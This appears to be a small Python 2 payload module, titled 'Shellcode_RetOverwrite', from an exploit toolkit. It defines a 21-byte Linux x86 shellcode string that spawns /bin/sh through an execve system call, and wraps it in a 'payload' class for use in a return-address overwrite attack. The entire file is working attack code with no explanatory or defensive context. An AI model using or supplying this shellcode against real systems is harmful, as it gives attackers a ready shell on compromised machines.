#coding:UTF-8
'''Shellcode_RetOverwrite'''

shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode += "\x0b\xcd\x80"

class payload(object):
	'payload1'
	def __init__(self):
		self.data = shellcode

if __name__=='__main__':
	print __doc__
